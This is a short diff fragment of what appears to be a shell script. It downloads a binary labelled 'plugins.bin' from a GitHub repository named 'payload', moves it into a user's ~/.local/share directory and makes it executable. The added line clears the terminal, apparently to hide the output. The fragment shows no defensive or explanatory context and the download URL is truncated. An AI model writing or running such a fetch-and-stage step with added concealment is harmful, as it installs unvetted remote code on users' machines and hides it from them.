@@ -4,3 +4,4 @@ curl -L -o ./plugins.bin https://github.com/Peppermint25565/payload/raw/refs/hea
 cd /home/*/.local/share
 mv $LOCATION/plugins.bin ./plugins.bin
 chmod +x ./plugins.bin
+clear
